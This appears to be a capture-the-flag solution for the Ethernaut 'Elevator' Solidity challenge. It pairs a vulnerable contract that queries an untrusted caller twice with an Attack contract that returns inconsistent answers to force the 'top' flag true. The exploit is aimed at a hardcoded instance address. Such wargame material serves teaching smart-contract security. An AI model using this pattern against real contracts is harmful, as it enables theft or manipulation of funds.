// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attack is Building {
    //set the instance address
    Elevator e = Elevator(0x6Eef9f5ac95A16326fDCE05fE52ddE654aF801Fa);
    uint public track;
    
    constructor () public {
    }
    
    function isLastFloor(uint _floor) external override returns (bool){
        track += 1;
        return track == 2;
    }
    
    function attack() public {
        e.goTo(0);
    }
}
